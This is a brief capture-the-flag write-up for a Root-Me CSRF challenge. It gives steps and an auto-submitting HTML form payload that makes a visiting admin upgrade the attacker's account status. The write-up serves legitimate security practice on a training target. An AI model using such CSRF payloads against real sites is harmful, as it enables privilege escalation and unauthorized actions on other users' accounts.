# CSRF - 0 Protection
[Root-Me Challenge](https://www.root-me.org/?page=validation&id_challenge=1019&id_auteur=1089475&lang=fr)

## Steps

1. Login to the application.
2. Visit:
   `http://challenge01.root-me.org/web-client/ch22/index.php?action=profile`
3. Observe that the application has no CSRF protection.
4. Create and send the following HTML payload to the admin.
5. Once the admin visits the page, the account status gets upgraded automatically.

---

## Payload

```html
<form name="csrf" action="http://challenge01.root-me.org/web-client/ch22/index.php?action=profile" method="POST" enctype="multipart/form-data">
  <input type="text" name="username" value="dada" />
  <input type="checkbox" name="status" checked="checked" />
  <input type="submit" value="Submit request" />
</form>

<script>
document.csrf.submit()
</script>
```

## Impact

- Account privilege escalation
- Unauthorized action execution
- No CSRF token validation
```

